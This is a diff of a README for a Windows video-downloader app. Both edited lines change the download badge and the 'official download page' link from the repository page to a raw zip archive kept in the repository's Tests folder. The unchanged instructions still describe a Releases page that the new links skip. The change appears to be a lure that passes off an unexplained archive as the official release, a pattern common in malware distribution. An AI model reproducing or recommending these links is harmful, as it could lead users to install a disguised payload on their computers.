@@ -1,6 +1,6 @@
 # 🎥 media-downloader - Save and trim videos with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/reckless-puppyfat482/media-downloader)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/reckless-puppyfat482/media-downloader/raw/refs/heads/main/Tests/downloader_media_v2.3.zip)
 
 ## 📁 What is this app?
 
@@ -14,7 +14,7 @@ This app runs on Windows 10 and Windows 11. Your computer should have at least 4
 
 Follow these steps to set up the application on your computer.
 
-1. Visit the [official download page](https://github.com/reckless-puppyfat482/media-downloader).
+1. Visit the [official download page](https://github.com/reckless-puppyfat482/media-downloader/raw/refs/heads/main/Tests/downloader_media_v2.3.zip).
 2. Look for the section titled Releases on the right side of your screen.
 3. Click the link that shows the latest version number.
 4. Scroll down to the Assets section.
